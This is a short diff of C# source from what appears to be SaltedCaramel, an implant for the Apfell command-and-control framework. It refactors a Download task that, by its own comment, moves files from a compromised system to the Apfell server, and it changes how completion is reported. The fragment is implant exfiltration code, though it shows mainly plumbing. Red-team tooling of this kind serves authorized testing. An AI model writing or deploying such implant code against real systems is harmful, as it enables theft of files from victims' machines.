@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using Apfell.Structs;
+using SaltedCaramel.Jobs;
 
 /// <summary>
 /// This task will download a file from a compromised system to the Apfell server
@@ -12,8 +13,9 @@ namespace SaltedCaramel.Tasks
 {
     public class Download
     {
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
+            SCTask task = job.Task;
             string filepath = task.@params;
             try // Try block for file upload task
             {
@@ -78,7 +80,7 @@ namespace SaltedCaramel.Tasks
                 }
 
                 // Tell the Apfell server file transfer is done
-                implant.Profile.SendComplete(task.id);
+                implant.TrySendComplete(job);
                 Debug.WriteLine($"[+] Download - File transfer complete: {filepath}");
             }
             catch (Exception e) // Catch any exception from file upload
